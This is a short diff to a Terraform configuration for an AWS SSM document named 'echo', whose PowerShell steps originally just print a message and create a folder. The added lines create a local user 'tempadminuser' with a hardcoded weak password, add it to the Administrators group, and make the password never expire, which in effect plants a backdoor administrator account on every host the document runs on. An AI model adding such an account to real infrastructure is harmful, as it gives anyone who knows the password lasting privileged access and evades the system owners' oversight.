@@ -40,7 +40,10 @@ resource "aws_ssm_document" "echo" {
       "inputs": {
         "runCommand": [
           "Write-Host 'Running PowerShell script'",
-          "new-item -ItemType Directory C:\test"
+          "new-item -ItemType Directory C:\test",
+          "New-LocalUser tempadminuser -Password P@ssw0rd -FullName 'TempAdminUser' -Description 'TempAdminUser'",
+          "Add-LocalGroupMember -Group 'Administrators' -Member tempadminuser",
+          "Set-LocalUser -Name tempadminuser -PasswordNeverExpires 1"
         ]
       }
     }
